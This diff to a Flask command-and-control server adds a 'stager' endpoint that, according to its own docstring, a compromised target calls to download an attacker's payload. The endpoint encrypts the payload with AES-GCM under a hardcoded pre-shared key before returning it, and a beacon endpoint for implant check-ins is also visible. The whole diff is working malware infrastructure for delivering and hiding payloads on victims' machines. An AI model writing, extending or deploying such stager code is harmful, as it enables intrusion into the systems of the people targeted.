@@ -7,6 +7,7 @@ import time
 
 from flask import Flask, request, jsonify
 from werkzeug.utils import secure_filename
+from Crypto.Cipher import AES
 from cryptography.hazmat.primitives.asymmetric import x25519
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives import hashes
@@ -108,6 +109,31 @@ def restore_key() -> bytes:
     with open("cert/derived.key", "rb") as f:
         shared_key = f.read()
     return shared_key
+
+
+@app.route(STAGER_ENDPOINT)
+def send_encrypted_payload():
+    """
+    Attacker calls this from the target to download the encrypted payload
+    Use pycryptodome here since target has it installed
+    """
+    # encrypt payload before sending if it doesnt exist
+    if not os.path.exists("dist/encrypted_payload"):
+        with open("dist/payload", "rb") as f:
+            plain = f.read()
+
+            pre_shared_key = b"Kg.\xe1\xfb\x8e\xf6\x81\xa2\xf0g\xd6\xfd\x00\x047\xd0m\xe3\xe7E@\x00\xb4=\xc7\xb4\xc4-\x87\x0c\x17"
+            nonce = os.urandom(12)
+            cipher = AES.new(pre_shared_key, AES.MODE_GCM, nonce=nonce)
+            ciphertext, tag = cipher.encrypt_and_digest(plain)
+
+            encrypted_payload = nonce + ciphertext + tag
+            return encrypted_payload
+
+    # else send encrypted payload
+    with open("dist/encrypted_payload", "rb") as f:
+        payload = f.read()
+        return payload
 
 
 @app.route(BEACON_ENDPOINT, methods=["POST"])
